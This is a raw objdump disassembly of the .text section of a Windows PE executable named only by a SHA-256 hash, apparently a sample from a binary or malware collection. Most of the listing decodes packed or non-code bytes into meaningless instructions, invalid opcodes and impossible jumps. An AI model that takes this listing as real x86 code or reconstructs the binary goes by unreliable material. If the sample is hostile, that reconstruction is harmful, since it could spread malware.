
336e5808cec5222e52eb262ab912cc45a74ce4cb08499bebcb3f6fe3ca9d196f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	add    BYTE PTR [ebp+0x1],dl
  402003:	add    BYTE PTR [ebx+0x52],ah
  402006:	inc    ecx
  402007:	add    BYTE PTR [eax+eiz*2],bl
  40200a:	je     0x40205c
  40200c:	adc    DWORD PTR [edx+0x63],ebp
  40200f:	inc    ecx
  402010:	jmp    DWORD PTR [eax+0x72]
  402013:	gs lock jne 0x402017
  402017:	add    BYTE PTR [edi],ah
  402019:	push   0x61
  40201b:	fs pop ds
  40201d:	ins    BYTE PTR es:[edi],dx
  40201e:	bound  esi,QWORD PTR [edx+0x2]
  402021:	ja     0x40209c
  402023:	inc    ebp
  402024:	fild   DWORD PTR [eax+eax*1+0x0]
  402028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402029:	push   0x61
  40202b:	fs lahf 
  40202d:	ins    BYTE PTR es:[edi],dx
  40202e:	bound  esi,QWORD PTR [edx-0x3e]
  402031:	ja     0x4020ac
  402033:	inc    ebp
  402034:	mov    ebx,0x9c000052
  402039:	pusha  
  40203a:	je     0x402089
  40203c:	mov    esp,0xbe6c7561
  402041:	dec    ebp
  402042:	popa   
  402043:	outs   dx,BYTE PTR ds:[esi]
  402044:	xchg   DWORD PTR [ecx+0x65],ebp
  402047:	inc    ecx
  402048:	arpl   WORD PTR ds:0x77a00000,ax
  40204e:	gs popa 
  402050:	(bad)  
  402051:	pusha  
  402052:	inc    esi
  402053:	imul   ecx,DWORD PTR [edi-0x78ffbea0],0x80727476
  40205d:	fs je  0x4020a1
  402060:	arpl   WORD PTR ds:0x60240000,ax
  402066:	je     0x4020bf
	...
  402074:	add    BYTE PTR [eax],al
  402076:	add    BYTE PTR [edx+0x6b],cl
  402079:	outs   dx,DWORD PTR fs:[esi]
  40207b:	push   esp
  40207c:	jbe    0x4020c2
  40207e:	imul   edx,DWORD PTR [ecx+0x60],0x774c7463
  402085:	jns    0x4020c8
  402087:	arpl   WORD PTR ds:0x60240000,ax
  40208d:	je     0x4020dc
  40208f:	xor    al,0x61
  402091:	jne    0x4020ff
  402093:	push   es
  402094:	dec    ebp
  402095:	popa   
  402096:	outs   dx,BYTE PTR ds:[esi]
  402097:	jmp    FWORD PTR [eax+0x65]
  40209a:	push   edi
  40209b:	arpl   WORD PTR ds:0x75f0000,ax
  4020a1:	inc    eax
  4020a2:	add    BYTE PTR [edi+0x7],dl
  4020a5:	inc    eax
  4020a6:	add    BYTE PTR [edi],bh
  4020a8:	pop    es
  4020a9:	inc    eax
  4020aa:	add    BYTE PTR [edi],dh
  4020ac:	pop    es
  4020ad:	inc    eax
  4020ae:	add    BYTE PTR [ebx],bl
  4020b0:	pop    es
  4020b1:	inc    eax
  4020b2:	add    BYTE PTR [edi-0x3cffbffd],dh
  4020b8:	add    eax,DWORD PTR [eax+0x0]
  4020bb:	retf   
  4020bc:	add    eax,DWORD PTR [eax+0x0]
  4020bf:	pushf  
  4020c0:	bound  esi,QWORD PTR [eax+edx*2-0x4f]
  4020c4:	push   0x61bf4163
  4020c9:	jb     0x402130
  4020cb:	mov    al,0x74
  4020cd:	add    BYTE PTR [eax],al
  4020cf:	xchg   edi,eax
  4020d0:	push   0x6eaf6461
  4020d5:	bound  esi,QWORD PTR [edx-0x7e]
  4020d8:	jae    0x402153
  4020da:	inc    ebp
	...
  4020e7:	add    BYTE PTR [eax],al
  4020e9:	add    BYTE PTR [ebx+0x78000046],cl
  4020ef:	bound  esi,QWORD PTR [edx+0x6e]
  4020f2:	xchg   BYTE PTR [ecx+0x33],ch
  4020f5:	xor    al,BYTE PTR [ebp+0x61]
  4020f8:	ins    BYTE PTR es:[edi],dx
  4020f9:	ins    BYTE PTR es:[edi],dx
  4020fa:	arpl   WORD PTR ds:0x74760000,ax
  402100:	jbe    0x402165
  402102:	push   ecx
  402103:	jno    0x402133
  402105:	fs inc edi
  402107:	imul   eax,DWORD PTR [eax],0x6d623e00
  40210d:	jae    0x40214d
  40210f:	jno    0x402111
  402111:	add    BYTE PTR [esi+0x74],cl
  402114:	jbe    0x402179
  402116:	xor    DWORD PTR [ecx+0x2e],esi
  402119:	fs aas 
  40211b:	imul   eax,DWORD PTR [eax],0x6d623600
  402121:	arpl   WORD PTR [ebx],dx
  402123:	jle    0x402125
  402125:	add    BYTE PTR ds:0x1674726e,ch
  40212b:	data16 ins BYTE PTR es:[edi],dx
  40212d:	inc    ecx
  40212e:	imul   DWORD PTR [eax+0x6f]
  402131:	arpl   WORD PTR [ebx+0x5],sp
  402134:	add    BYTE PTR [eax],al
  402136:	or     eax,0xf674726e
  40213b:	gs ins BYTE PTR es:[edi],dx
  40213d:	inc    ecx
  40213e:	imul   DWORD PTR [eax+0x6f]
  402141:	arpl   WORD PTR [ebx+0x5],sp
  402144:	add    BYTE PTR [eax],al
  402146:	scas   al,BYTE PTR es:[edi]
  402147:	ins    DWORD PTR es:[di],dx
  402149:	popa   
  40214a:	ror    DWORD PTR [edi+0x69],cl
  40214d:	add    BYTE PTR gs:[eax],al
	...
  40215c:	add    ah,cl
  40215e:	dec    eax
  40215f:	inc    si
  402161:	retf   0x6569
  402164:	add    BYTE PTR [ebp-0x498b8d92],cl
  40216a:	data16 ins BYTE PTR es:[edi],dx
  40216c:	push   eax
  40216d:	mov    cl,0x68
  40216f:	je     0x4021d6
  402171:	xor    BYTE PTR [ecx+0x0],0x0
  402175:	stos   DWORD PTR es:[edi],eax
  402176:	bound  esp,QWORD PTR [ecx+0x70]
  402179:	mov    ds:0x806f6c69,al
  40217e:	add    eax,0x62880000
  402183:	jb     0x4021f3
  402185:	jle    0x4021f0
  402187:	xor    esi,DWORD PTR [edx]
  402189:	cmp    eax,0x636c6c61
  40218e:	add    eax,0x62240000
  402193:	je     0x4021e5
  402195:	push   ecx
  402196:	push   0x74506563
  40219b:	dec    eax
  40219c:	gs inc edx
  40219e:	jne    0x4021a0
  4021a0:	add    BYTE PTR [ebx+0x5],ah
  4021a3:	inc    esp
  4021a4:	add    DWORD PTR [ebx-0x5f],esp
  4021a7:	pop    ecx
  4021a8:	nop
  4021a9:	arpl   bx,bp
  4021ab:	add    eax,DWORD PTR [eax]
  4021ad:	arpl   dx,bp
  4021af:	add    eax,DWORD PTR [eax]
  4021b1:	arpl   di,si
  4021b3:	sti    
  4021b4:	add    BYTE PTR [ebx+0x36],ah
  4021b7:	add    eax,DWORD PTR [eax]
  4021b9:	arpl   si,bp
  4021bb:	add    eax,DWORD PTR [eax]
  4021bd:	arpl   WORD PTR [esi],bp
  4021bf:	add    al,0x0
	...
  4021cd:	add    BYTE PTR [eax],al
  4021cf:	add    BYTE PTR [ebx-0x12],ah
  4021d2:	add    eax,DWORD PTR [eax]
  4021d4:	arpl   si,bp
  4021d6:	add    eax,DWORD PTR [eax]
  4021d8:	arpl   si,bp
  4021da:	add    eax,DWORD PTR [eax]
  4021dc:	arpl   si,bp
  4021de:	add    eax,DWORD PTR [eax]
  4021e0:	arpl   sp,bp
  4021e2:	add    eax,DWORD PTR [eax]
  4021e4:	arpl   sp,bp
  4021e6:	add    eax,DWORD PTR [eax]
  4021e8:	arpl   sp,bp
  4021ea:	add    eax,DWORD PTR [eax]
  4021ec:	arpl   sp,bp
  4021ee:	add    eax,DWORD PTR [eax]
  4021f0:	arpl   WORD PTR [esp+eax*1+0x0],bp
  4021f4:	arpl   si,bx
  4021f6:	sbb    bh,BYTE PTR [edx+0x9afec5d]
  4021fc:	push   ss
  4021fd:	into   
  4021fe:	mov    ebx,0x25a9af01
  402203:	push   esp
  402204:	mov    eax,DWORD PTR ds:0xfa932077
  40220a:	push   0x67
  40220c:	xchg   ecx,eax
  40220d:	int    0x68
  40220f:	and    BYTE PTR [eax-0x7b919633],al
  402215:	fsub   DWORD PTR [ebx]
  402217:	bound  eax,QWORD PTR [esi+0x7575760c]
  40221d:	or     al,0x6d
  40221f:	outs   dx,BYTE PTR ds:[esi]
  402220:	and    DWORD PTR [eax-0x3e7cacb6],0x6a
  402227:	fs inc esi
  402229:	test   BYTE PTR [eax],0xd
  40222c:	pop    ecx
  40222d:	add    eax,0x56303cd
  402232:	jmp    0x40223a
	...
  402243:	arpl   WORD PTR ds:0x56340b9,ax
  402249:	popf   
  40224a:	add    al,0x60
  40224c:	add    eax,0x46f497b2
  402251:	jmp    0xe9458559
  402256:	add    esp,DWORD PTR [ebx+0x5]
  402259:	or     DWORD PTR [esp+edx*2],eax
  40225c:	add    al,0xf2
  40225e:	add    al,0x61
  402260:	xor    ebp,ecx
  402262:	stc    
  402263:	arpl   WORD PTR ds:0x5634de9,ax
  402269:	jmp    0x55458571
  40226e:	in     eax,dx
  40226f:	arpl   WORD PTR ds:0x56313e9,ax
  402275:	jmp    0xe945848d
  40227a:	add    esp,DWORD PTR [ebx+0x6313e905]
  402280:	add    eax,0x56305e9
  402285:	in     eax,dx
  402286:	add    esp,DWORD PTR [ebx+0x5]
  402289:	jmp    0xed458591
  40228e:	add    esp,DWORD PTR [ebx+0x5]
  402291:	jmp    0xe9458599
  402296:	jae    0x4022fa
  402298:	add    eax,0x56305e9
  40229d:	fcom   st(5)
  40229f:	bound  eax,QWORD PTR ds:0x56303eb
  4022a5:	jmp    0x4022ad
	...
  4022b6:	push   ebx
  4022b7:	add    eax,0x56313e9
  4022bc:	jmp    0xe94595c4
  4022c1:	adc    esp,DWORD PTR [ebx+0x5]
  4022c4:	add    cl,ch
  4022c6:	pusha  
  4022c7:	add    eax,0x560d900
  4022cc:	add    cl,ch
  4022ce:	pusha  
  4022cf:	add    eax,0x560e900
  4022d4:	add    cl,cl
  4022d6:	adc    DWORD PTR [eax+eax*1],eax
  4022d9:	and    DWORD PTR [eax+0x5],esp
  4022dc:	add    cl,ch
  4022de:	pusha  
  4022df:	add    eax,0x560e900
  4022e4:	add    cl,ch
  4022e6:	pusha  
  4022e7:	add    eax,0x560e900
  4022ec:	add    cl,ch
  4022ee:	pusha  
  4022ef:	add    eax,0x560e900
  4022f4:	add    cl,ch
  4022f6:	pusha  
  4022f7:	add    eax,0x560e900
  4022fc:	add    cl,ch
  4022fe:	pusha  
  4022ff:	add    eax,0x560e900
  402304:	add    cl,ch
  402306:	pusha  
  402307:	add    eax,0x560e900
  40230c:	add    cl,ch
  40230e:	pusha  
  40230f:	add    eax,0x560e900
  402314:	add    cl,ch
  402316:	pusha  
  402317:	add    eax,0xe900
	...
  402328:	add    BYTE PTR [eax+0x5],ah
  40232b:	add    cl,ch
  40232d:	pusha  
  40232e:	add    eax,0x560e900
  402333:	add    cl,ch
  402335:	pusha  
  402336:	add    eax,0x560e900
  40233b:	add    ch,bl
  40233d:	cdq    
  40233e:	push   es
  40233f:	add    BYTE PTR [ebp+0x60],ch
  402342:	add    eax,0x560e900
  402347:	add    cl,ch
  402349:	pusha  
  40234a:	add    eax,0x8ca0000
  40234f:	add    BYTE PTR [eax],al
  402351:	retf   0x8
  402354:	add    BYTE PTR [edx-0x45fffff8],bh
  40235a:	or     BYTE PTR [eax],al
  40235c:	add    BYTE PTR [esp+eiz*2+0x8ce7865],dl
  402363:	add    BYTE PTR [eax],al
  402365:	inc    ecx
  402366:	cld    
  402367:	add    BYTE PTR [eax],al
  402369:	mov    edx,0x8a000018
  40236e:	out    dx,al
  40236f:	add    BYTE PTR [eax],al
  402371:	mov    cl,BYTE PTR [edx]
  402373:	add    BYTE PTR [eax],al
  402375:	jp     0x40237f
  402377:	add    BYTE PTR [eax],al
  402379:	jp     0x402383
  40237b:	add    BYTE PTR [eax],al
  40237d:	mov    cl,BYTE PTR [eax]
  40237f:	add    BYTE PTR [eax],al
  402381:	push   0x9
  402383:	add    BYTE PTR [eax+0x64],ah
  402386:	jnp    0x4023ec
  402388:	popa   
  402389:	push   cs
  40238a:	push   0x0
	...
  40239b:	add    BYTE PTR [edx+0x7],cl
  40239e:	add    BYTE PTR [eax],al
  4023a0:	dec    edx
  4023a1:	sbb    BYTE PTR [ecx],al
  4023a3:	add    BYTE PTR [edx],bh
  4023a5:	or     al,BYTE PTR [eax]
  4023a7:	add    BYTE PTR [edx],bh
  4023a9:	or     BYTE PTR [ecx],al
  4023ab:	add    BYTE PTR [edx+0x8],cl
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	dec    edx
  4023b1:	or     BYTE PTR [eax],al
  4023b3:	add    BYTE PTR [edx],bh
  4023b5:	or     BYTE PTR [eax],al
  4023b7:	add    BYTE PTR [edx+0x9],bh
  4023ba:	add    BYTE PTR [eax+0x34],al
  4023bd:	push   esp
  4023be:	popa   
  4023bf:	je     0x40242c
  4023c1:	or     DWORD PTR [eax],eax
  4023c3:	add    BYTE PTR [edx+0x46],dl
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	cli    
  4023c9:	daa    
  4023ca:	add    DWORD PTR [eax],eax
  4023cc:	or     cl,BYTE PTR [edx+0x0]
  4023cf:	add    BYTE PTR [edx],cl
  4023d1:	or     al,BYTE PTR [ecx]
  4023d3:	add    BYTE PTR [ebx-0x22],ah
  4023d6:	add    eax,DWORD PTR [eax]
  4023d8:	arpl   si,bx
  4023da:	add    eax,DWORD PTR [eax]
  4023dc:	arpl   si,bx
  4023de:	add    eax,DWORD PTR [eax]
  4023e0:	arpl   WORD PTR [esi-0x225cfffd],bx
  4023e6:	add    eax,DWORD PTR [eax]
  4023e8:	arpl   si,bx
  4023ea:	add    eax,DWORD PTR [eax]
  4023ec:	arpl   si,bx
  4023ee:	add    eax,DWORD PTR [eax]
  4023f0:	arpl   si,bx
  4023f2:	add    eax,DWORD PTR [eax]
  4023f4:	arpl   WORD PTR [ecx-0x2ec41374],si
  4023fa:	adc    eax,DWORD PTR [eax+0x63]
  4023fd:	push   es
  4023fe:	jne    0x402401
	...
  40240c:	add    BYTE PTR [eax],al
  40240e:	add    BYTE PTR [eax+0x5b75f7f2],ah
  402414:	mov    BYTE PTR [edx],al
  402416:	push   0x63
  402418:	push   es
  402419:	mov    esp,0xccde63da
  40241e:	ret    0xde5f
  402421:	push   eax
  402422:	mov    edi,DWORD PTR [edi+0x45]
  402425:	sub    dl,BYTE PTR [eax]
  402427:	and    ebx,esi
  402429:	sti    
  40242a:	jb     0x40248e
  40242c:	lahf   
  40242d:	test   DWORD PTR [ebx+0x7403f4d6],0x8516758
  402437:	fmul   st,st(6)
  402439:	div    BYTE PTR [ebp+0x6b]
  40243c:	stos   DWORD PTR es:[edi],eax
  40243d:	push   edx
  40243e:	or     BYTE PTR [edx],ch
  402440:	lahf   
  402441:	add    BYTE PTR [eax],al
  402443:	xchg   esi,eax
  402444:	addr16 call 0x6cd543cd
  40244a:	dec    edi
  40244b:	jae    0x402469
  40244d:	add    al,0xf8
  40244f:	xchg   ecx,eax
  402450:	ffree  st(2)
  402452:	dec    DWORD PTR [edx+esi*8]
  402455:	pop    es
  402456:	(bad)  
  402457:	sahf   
  402458:	je     0x402419
  40245a:	inc    ebp
  40245b:	inc    DWORD PTR ds:0x56303e9
  402461:	jb     0x4024b4
  402463:	pop    ebx
  402464:	jle    0x402461
  402466:	imul   esp,DWORD PTR [ebx-0xe],0x78dc13d4
  40246d:	inc    ebp
  40246e:	test   DWORD PTR [esi-0x13],0x713e
	...
  402481:	add    BYTE PTR [ebx-0xe],bl
  402484:	fwait
  402485:	setp   bh
  402488:	fld    QWORD PTR [ebx]
  40248a:	push   ss
  40248b:	jle    0x4024a2
  40248d:	sbb    DWORD PTR [edi+0x537d91ed],0x45
  402494:	jmp    0x2a445694
  402499:	mul    DWORD PTR [eax+ecx*2+0x5630401]
  4024a0:	jmp    0xea314b63
  4024a5:	add    esp,DWORD PTR [ebx+0x5]
  4024a8:	bound  edx,QWORD PTR [ecx+0x6b]
  4024ab:	jle    0x4024a8
  4024ad:	mov    BYTE PTR [esi],bl
  4024af:	in     eax,dx
  4024b0:	cmp    DWORD PTR [edx+0x61],ebp
  4024b3:	repnz pop esp
  4024b5:	clc    
  4024b6:	fs js  0x40248a
  4024b9:	not    dh
  4024bb:	std    
  4024bc:	lds    edx,FWORD PTR [ecx+0x6f]
  4024bf:	jle    0x4024e5
  4024c1:	cld    
  4024c2:	sbb    al,bh
  4024c4:	in     eax,dx
  4024c5:	add    ebp,DWORD PTR [esi+0x2782bd7e]
  4024cb:	in     eax,dx
  4024cc:	adc    edx,eax
  4024ce:	push   ebx
  4024cf:	inc    ebp
  4024d0:	jmp    0xaa44d6d0
  4024d5:	neg    BYTE PTR [eax+ecx*2]
  4024d8:	xchg   ecx,eax
  4024d9:	add    esp,DWORD PTR [ebx+0x5]
  4024dc:	jmp    0xea31c39f
  4024e1:	add    esp,DWORD PTR [ebx+0x5]
  4024e4:	add    BYTE PTR [edx+0x0],ah
	...
  4024f3:	add    BYTE PTR [eax],al
  4024f5:	mov    bl,0xfd
  4024f7:	mov    bl,bl
  4024f9:	jmp    0x402542
  4024fb:	clc    
  4024fc:	mov    ecx,0xd4ff048a
  402501:	hlt    
  402502:	icebp  
  402503:	jne    0x402556
  402505:	in     eax,dx
  402506:	ja     0x402510
  402508:	dec    esi
  402509:	xor    bl,BYTE PTR [ecx]
  40250b:	(bad)  
  40250c:	mov    esp,0x3e87dd68
  402511:	aad    0xf1
  402513:	push   eax
  402514:	bound  esi,QWORD PTR [ebx]
  402516:	std    
  402517:	mov    bl,bl
  402519:	dec    edx
  40251a:	add    eax,0x77ade96a
  40251f:	cld    
  402520:	push   ds
  402521:	xor    ebp,ebp
  402523:	call   FWORD PTR [eax+ebx*2+0x38f552f2]
  40252a:	jle    0x402581
  40252c:	add    DWORD PTR [ecx+0x58],esp
  40252f:	or     al,0xc2
  402531:	mov    al,0x7a
  402533:	push   es
  402534:	ret    0xbba0
  402537:	ret    0x60e1
  40253a:	lods   eax,DWORD PTR ds:[esi]
  40253b:	add    ecx,ebp
  40253d:	pusha  
  40253e:	add    eax,0x55fabc9
  402543:	push   ebp
  402544:	bound  edi,QWORD PTR [ebx-0x7b]
  402547:	(bad)  
  402548:	int    0xcf
  40254a:	and    BYTE PTR [ecx],dl
  40254c:	sub    DWORD PTR [edi-0x13],ebx
  40254f:	jb     0x402539
  402551:	and    esi,ecx
  402553:	(bad)  
  402554:	cmp    al,0x6f
  402556:	lock jne 0x40253a
	...
  402565:	add    BYTE PTR [eax],al
  402567:	add    BYTE PTR [eax+0x6e],cl
  40256a:	jmp    DWORD PTR [esi+0x14bffd2e]
  402570:	arpl   WORD PTR [esi+0x7c60e5c2],di
  402576:	push   ebp
  402577:	loope  0x402564
  402579:	adc    ecx,DWORD PTR [ebp+0x50ed4700]
  40257f:	call   DWORD PTR [edi]
  402581:	adc    eax,0xf9fe75ff
  402586:	jne    0x402590
  402588:	lea    edx,[ebx+0xc]
  40258b:	test   DWORD PTR [edx+0x71],ecx
  40258e:	adc    ecx,DWORD PTR [ebx+0x453bf8c7]
  402594:	jmp    0x4:0xcbb8075f
  40259b:	add    BYTE PTR [ecx],dh
  40259d:	out    dx,eax
  40259e:	sub    al,al
  4025a0:	xor    DWORD PTR [ebx],eax
  4025a2:	sub    eax,eax
  4025a4:	add    ebx,0xc
  4025a7:	add    bh,dl
  4025a9:	jge    0x402597
  4025ab:	add    DWORD PTR [esi+0x476856ed],0x14
  4025b2:	inc    eax
  4025b3:	add    BYTE PTR [edx+0x73],dl
  4025b6:	add    ebx,eax
  4025b8:	ins    DWORD PTR es:[edi],dx
  4025b9:	xchg   BYTE PTR [ebp+0xc],bh
  4025bc:	mov    ah,BYTE PTR [eax+0x6]
  4025bf:	or     DWORD PTR [edi],0xfffffffc
  4025c2:	push   DWORD PTR [ebp+esi*2+0x1d]
  4025c6:	rcr    BYTE PTR [esi+0x43],0xc3
  4025ca:	or     al,0x0
	...
  4025d8:	add    BYTE PTR [eax],al
  4025da:	add    BYTE PTR [ecx],cl
  4025dc:	ja     0x4025ee
  4025de:	add    BYTE PTR [edi],dl
  4025e0:	sti    
  4025e1:	mov    bh,0x1
  4025e3:	jp     0x4025e9
  4025e5:	add    BYTE PTR [esi+0x3],bl
  4025e8:	(bad)  
  4025e9:	or     al,0x0
  4025eb:	rcr    DWORD PTR [edi+0xc],1
  4025ee:	mov    DWORD PTR [edi+0x3a0000ed],0x42558b04
  4025f8:	jge    0x40260c
  4025fa:	lea    eax,[edi+0x57ff50ed]
  402600:	sbb    DWORD PTR [esi-0x1],edx
  402603:	arpl   WORD PTR [ecx],dx
  402605:	or     al,0xff
  402607:	mov    cl,0xee
  402609:	jle    0x4025cb
  40260b:	call   0xc1b5:0xadc028df
  402612:	or     al,0x63
  402614:	pop    ebx
  402615:	jbe    0x402613
  402617:	arpl   cx,di
  402619:	cld    
  40261a:	sub    ah,BYTE PTR [ebx]
  40261c:	enter  0xc2ca,0x5f
  402620:	fimul  WORD PTR [eax-0xc2518bb]
  402626:	sub    DWORD PTR [esi],esp
  402628:	out    dx,al
  402629:	outs   dx,BYTE PTR ds:[esi]
  40262a:	les    ebx,FWORD PTR [ebx]
  40262c:	fld    QWORD PTR [ebx]
  40262e:	add    BYTE PTR [ebx-0x70],ah
  402631:	retf   0x57c2
  402634:	fimul  WORD PTR [esi-0x75]
  402637:	iret   
  402638:	pop    esp
  402639:	mov    edi,0xf426c4f8
  40263e:	push   0x0
	...
  40264b:	add    BYTE PTR [eax],al
  40264d:	add    BYTE PTR [edi-0x14],ah
  402650:	inc    ebx
  402651:	add    BYTE PTR [ebx-0x633cfd75],ch
  402657:	add    DWORD PTR [ebx],0x6a
  40265a:	arpl   WORD PTR [eax+eax*1+0x94636a],dx
  402661:	push   0x8003de63
  402666:	jl     0x4026e0
  402668:	or     ebp,eax
  40266a:	loop   0x40261a
  40266c:	add    al,0x0
  40266e:	fisubr DWORD PTR [eax]
  402670:	lock inc eax
  402672:	out    dx,al
  402673:	loope  0x402631
  402675:	ret    0xdc6b
  402678:	pop    ebp
  402679:	add    dh,ah
  40267b:	and    esp,ebp
  40267d:	push   eax
  40267e:	mov    ebx,0x630013dc
  402683:	imul   ecx,DWORD PTR [ecx-0xc5fb308],0x1c063450
  40268d:	lock cmp esp,DWORD PTR [ebx-0x4a]
  402691:	add    al,0x63
  402693:	cli    
  402694:	test   al,0x79
  402696:	ins    DWORD PTR es:[edi],dx
  402697:	out    dx,al
  402698:	adc    al,0xf0
  40269a:	or     edx,DWORD PTR [ecx-0x62]
  40269d:	add    al,0x63
  40269f:	sbb    ch,BYTE PTR [ecx-0x1701de43]
  4026a5:	bnd jbe 0x402695
  4026a8:	pop    esp
  4026a9:	mov    ebx,edi
  4026ab:	fisub  WORD PTR [esi-0xd]
  4026ae:	xchg   ebx,eax
  4026af:	out    dx,al
  4026b0:	aam    0xff
	...
  4026be:	add    BYTE PTR [eax],al
  4026c0:	add    ah,bh
  4026c2:	adc    al,0x56
  4026c4:	repz fadd QWORD PTR [edx+0x7863ebcc]
  4026cb:	test   ebx,esi
  4026cd:	push   esi
  4026ce:	icebp  
  4026cf:	push   ecx
  4026d0:	cmp    ebp,DWORD PTR [ebp+eax*1+0x562abe9]
  4026d7:	jmp    0xf203d0df
  4026dc:	add    edx,DWORD PTR [esi]
  4026de:	jp     0x4026ed
  4026e0:	pop    esp
  4026e1:	fcom   QWORD PTR [ebx]
  4026e3:	test   eax,0xe8739b03
  4026e8:	(bad)  
  4026e9:	xchg   esp,eax
  4026ea:	pop    ebx
  4026eb:	jmp    0x40274a
  4026ed:	arpl   si,bp
  4026ef:	je     0x4026ec
  4026f1:	jl     0x402694
  4026f3:	hlt    
  4026f4:	bnd jl 0x4026b3
  4026f7:	sub    ecx,DWORD PTR [eax]
  4026f9:	arpl   WORD PTR [eax+0x72],bx
  4026fc:	(bad)  
  4026fe:	test   al,0xfb
  402700:	inc    ebx
  402701:	arpl   bp,bp
  402703:	pop    ebx
  402704:	add    eax,0x443ee20
  402709:	leave  
  40270a:	add    eax,0xdd5b78c6
  40270f:	outs   dx,BYTE PTR ds:[esi]
  402710:	lock inc esp
  402712:	out    dx,al
  402713:	add    BYTE PTR [eax+0x14000926],ah
  402719:	mov    ah,0xe1
  40271b:	sub    DWORD PTR [ebp-0x43ba2c8],0xffffffa0
  402722:	add    eax,0x1bf8
	...
  402733:	add    BYTE PTR [esi-0x3e],ah
  402736:	dec    DWORD PTR [esi+0x2c8f019b]
  40273c:	inc    ebp
  40273e:	inc    ebp
  40273f:	jge    0x4027a1
  402741:	add    eax,0x59ee900
  402746:	push   esp
  402748:	hlt    
  402749:	out    dx,al
  40274a:	jne    0x40273d
  40274c:	or     BYTE PTR [ebp+edi*8+0x5e],ah
  402750:	icebp  
  402751:	jns    0x4027a8
  402753:	loope  0x4027b2
  402755:	adc    edi,edi
  402757:	aam    0xc4
  402759:	in     eax,dx
  40275a:	jne    0x40279d
  40275c:	shl    DWORD PTR [edi+0x8],1
  40275f:	ds cs or eax,0xedb82bc9
  402766:	push   esp
  402767:	bound  edx,QWORD PTR [esp+ebx*2+0x520fa00]
  40276e:	clc    
  40276f:	fwait
  402770:	pop    edi
  402771:	ret    0x83ff
  402774:	pusha  
  402775:	out    dx,al
  402776:	jne    0x402759
  402778:	mov    eax,0x9106ff9a
  40277d:	mov    ebx,0x5860e5c2
  402782:	mov    eax,DWORD PTR ds:0x6a1457fd
  402788:	inc    esi
  402789:	add    eax,0xc2a9ed75
  40278e:	adc    cl,ch
  402790:	jae    0x402809
  402792:	adc    dh,dl
  402794:	aam    0xf9
  402796:	(bad)  
  402797:	push   esp
	...
  4027a4:	add    BYTE PTR [eax],al
  4027a6:	add    BYTE PTR [edi-0x1b],dl
  4027a9:	hlt    
  4027aa:	add    BYTE PTR [edi],ah
  4027ac:	idiv   edi
  4027ae:	mov    ebp,DWORD PTR [edi+0xd]
  4027b1:	and    DWORD PTR [edx],eax
  4027b3:	add    eax,esp
  4027b5:	adc    BYTE PTR [eax],al
  4027b7:	dec    edi
  4027b8:	push   0xffffffec
  4027ba:	cmp    esi,0xfffffff5
  4027bd:	push   DWORD PTR [ebp+0x36]
  4027c0:	dec    ebx
  4027c1:	add    al,0x8d
  4027c3:	dec    edi
  4027c4:	cmc    
  4027c5:	push   eax
  4027c6:	jmp    FWORD PTR [edi-0x17]
  4027c9:	out    0xc3,eax
  4027cb:	in     eax,0xf6
  4027cd:	dec    DWORD PTR [ebx+0x3883053f]
  4027d3:	or     dh,BYTE PTR [ebp+0x7]
  4027d6:	mov    edi,DWORD PTR [edi]
  4027d8:	cmc    
  4027d9:	bswap  eax
  4027db:	xchg   ecx,eax
  4027dc:	add    ebp,DWORD PTR [ebx]
  4027de:	shl    BYTE PTR [ebx],0xc3
  4027e1:	or     BYTE PTR [eax],al
  4027e3:	pop    ds
  4027e4:	push   0xffffffec
  4027e6:	cmp    DWORD PTR [esi-0xb],0xffffffff
  4027ea:	jne    0x4027c2
  4027ec:	dec    edx
  4027ed:	add    cl,BYTE PTR [ebp-0xaf0901]
  4027f3:	push   eax
  4027f5:	out    0x97,eax
  4027f7:	test   esi,esi
  4027f9:	dec    DWORD PTR [ebx+0x3882ecff]
  4027ff:	mov    edx,0x3d0f0874
  402804:	inc    esp
  402805:	inc    BYTE PTR [esi+0x2b02ca3e]
	...
  402817:	add    BYTE PTR [eax],al
  402819:	add    BYTE PTR [edx],bh
  40281b:	mov    al,0xc2
  40281d:	or     BYTE PTR [edx+0x53],bh
  402820:	mov    ebp,esp
  402822:	or     DWORD PTR [ebp-0x14100004],edi
  402828:	imul   eax,DWORD PTR [ecx],0x50ff42f7
  40282e:	test   DWORD PTR [ebx+0x8],esi
  402831:	call   0x317099
  402836:	push   esp
  402837:	addr16 inc esi
  402839:	or     al,0xe0
  40283b:	add    eax,0xdb5d7404
  402840:	mov    ecx,0x5c73c45
  402845:	sub    esp,DWORD PTR [ebx]
  402847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402848:	lds    ecx,FWORD PTR [eax]
  40284a:	arpl   WORD PTR [ecx],bp
  40284c:	jge    0x40283a
  40284e:	fdiv   DWORD PTR [eax]
  402850:	adc    al,0x83
  402852:	pop    ecx
  402853:	fidiv  WORD PTR [esi+0x4]
  402856:	sub    ah,BYTE PTR [eax-0x16f20001]
  40285c:	(bad)  
  40285d:	dec    BYTE PTR [esi-0x1f240a]
  402863:	jb     0x402855
  402865:	or     esp,DWORD PTR [ebx]
  402867:	icebp  
  402868:	cld    
  402869:	mov    dl,BYTE PTR [esi+0x6302c8ee]
  40286f:	fiadd  WORD PTR [ebx]
  402871:	add    al,cl
  402873:	loopne 0x4028d2
  402875:	add    esp,edx
  402877:	sar    bh,1
  402879:	(bad)  
  40287a:	push   esi
  40287b:	neg    bl
  40287d:	push   ecx
	...
  40288a:	add    BYTE PTR [eax],al
  40288c:	add    bh,al
  40288e:	sub    dh,al
  402890:	leave  
  402891:	mov    eax,ds:0xe85503e1
  402896:	sub    DWORD PTR [esp+eax*8+0x757cabaf],eax
  40289d:	push   edi
  40289e:	cwde   
  40289f:	add    ecx,DWORD PTR [ebp-0xacedda]
  4028a5:	push   cs
  4028a6:	out    dx,al
  4028a7:	pop    ecx
  4028a8:	call   DWORD PTR [esi]
  4028aa:	neg    bl
  4028ac:	mov    al,ds:0xb03ddae
  4028b1:	mov    ds:0xf6830969,eax
  4028b6:	fld    DWORD PTR [edx]
  4028b8:	jne    0x40291e
  4028ba:	add    eax,0xbe05c412
  4028bf:	stos   DWORD PTR es:[edi],eax
  4028c0:	add    BYTE PTR [ebx+0x7e],ah
  4028c3:	sub    al,0xf0
  4028c5:	pusha  
  4028c6:	cmc    
  4028c7:	add    BYTE PTR [ecx+0x73],cl
  4028ca:	jo     0x402866
  4028cc:	lods   al,BYTE PTR ds:[esi]
